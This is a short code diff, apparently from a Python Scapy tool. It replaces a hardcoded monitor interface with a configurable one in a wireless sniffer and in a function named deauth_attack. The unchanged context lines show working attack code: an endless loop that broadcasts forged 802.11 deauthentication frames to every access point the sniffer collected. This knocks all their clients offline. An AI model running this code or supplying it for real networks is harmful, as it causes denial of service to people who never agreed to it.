@@ -18,7 +18,7 @@ def mainsniffer():
         global AP_SSID 
         AP_SSID = []
         
-        sniff(iface="mon0", prn=pkt_callback, timeout=5)
+        sniff(iface=wificard.mon_interface, prn=pkt_callback, timeout=5)
 
         time.sleep(10)
         continue
@@ -47,5 +47,5 @@ def deauth_attack():
     while True:    
         for bssid in AP_BSSID:
             pkt = RadioTap() / Dot11(addr1=BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
-            sendp(pkt, iface="mon0", count=10, verbose=False)
+            sendp(pkt, iface=wificard.mon_interface, count=10, verbose=False)
             print("packet sent to " + bssid)
